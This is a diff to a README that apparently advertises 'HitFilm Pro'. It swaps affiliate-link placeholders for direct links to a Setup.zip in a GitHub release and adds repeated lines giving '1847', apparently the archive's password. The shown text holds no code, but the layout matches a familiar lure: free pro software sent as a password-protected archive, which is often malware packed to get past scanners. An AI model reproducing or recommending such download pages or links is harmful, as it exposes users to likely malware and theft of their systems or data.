@@ -8,7 +8,13 @@
 
 ---
 
-[![HitFilm Pro](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![HitFilm Pro](og-image.png)](https://github.com/BasinClassFlex/HitFilm-Tools/releases/download/Last/Setup.zip)
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
@@ -22,7 +28,12 @@
 
 ## Download & Get Pro
 
-[![Get HitFilm Pro Pro](https://img.shields.io/badge/Get%20HitFilm%20Pro%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get HitFilm Pro Pro](https://img.shields.io/badge/Get%20HitFilm%20Pro%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/BasinClassFlex/HitFilm-Tools/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
